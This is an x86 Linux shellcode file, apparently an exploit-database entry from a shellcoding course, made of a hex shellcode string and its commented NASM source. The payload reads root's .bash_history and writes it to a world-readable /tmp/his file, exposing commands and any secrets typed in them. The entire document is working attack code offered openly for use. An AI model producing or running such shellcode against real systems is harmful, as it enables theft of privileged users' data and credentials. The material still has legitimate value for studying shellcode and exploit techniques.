; Exploit Title: Copy /root/.bash_history to /tmp/his (0755)
; Date: November 25th, 2018
; Exploit Author: Nelis
; Version: 0.1
; Tested on: Ubuntu 12.10
; Filename: history.nasm
; SLAE-ID: 1327
; Based on: EBD ID 43750 Paolo Stivanin
; Job needs to run as root in order to collect the info, otherwise the resulting file will exist be be empty.

; Shellcode:
; "\x31\xc0\xb0\x05\x31\xc9\x51\x68\x74\x6f\x72\x79\x68\x5f\x68\x69\x73\x68\x62\x61\x73\x68\x68\x6f\x74\x2f\x2e\x68\x2f\x2f\x72\x6f\x89\xe3\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\xba\xff\xff\xcd\x80\x96\xb0\x05\x31\xc9\x51\x68\x2f\x68\x69\x73\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x41\x66\xba\xed\x01\xcd\x80\x89\xc3\xb0\x04\x89\xf9\x66\xba\xff\xff\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80"


global _start			

section .text
_start:

	xor eax,eax		; empty eax
	mov al,0x5		; syscall NR_open
	xor ecx,ecx		; empty ecx
	push ecx		; push 0-term byte in stack
	push 0x79726f74
	push 0x7369685f
	push 0x68736162
	push 0x2e2f746f
	push 0x6f722f2f		; push //root/.bash_history to stack in reverse order
	mov ebx,esp		; save esp to ebx
	int 0x80		; make syscall
 
	mov ebx,eax		; save file descriptor in ebx
	mov al,0x3		; syscall NR_read
	mov edi,esp		; save //root/.bash_history to edi (for later use)
	mov ecx,edi		; move into ecx the value of edi
	mov dx, word 0xffff	; read all data 
	int 0x80		; make syscall

	xchg esi,eax		; saving return value in esi and empty eax

	mov al,0x5		; syscall NR_open
	xor ecx,ecx		; empty ecx register
	push ecx		; push 0-term on the stack		
	push 0x7369682f		;
	push 0x706d742f		; put "/tmp/his" in reverse on stack
	mov ebx,esp		; save pointer to ebx
	mov cl,0x41		; O_WRONLY | O_CREAT
	mov dx,0x01ed		; set file mode bits to 0755
	int 0x80		; make the syscall

	mov ebx,eax		; save file descriptor to ebx
	mov al,0x4		; syscall NR_write 4
	mov ecx,edi		; move into ecx: //root/.bash_history
	mov dx, word 0xffff	; write all data
	int 0x80		; make the syscall
 
	xor eax,eax		; empty eax
	xor ebx, ebx		; empty ebx
	mov al,0x1		; exit
	int 0x80		; Goodbye


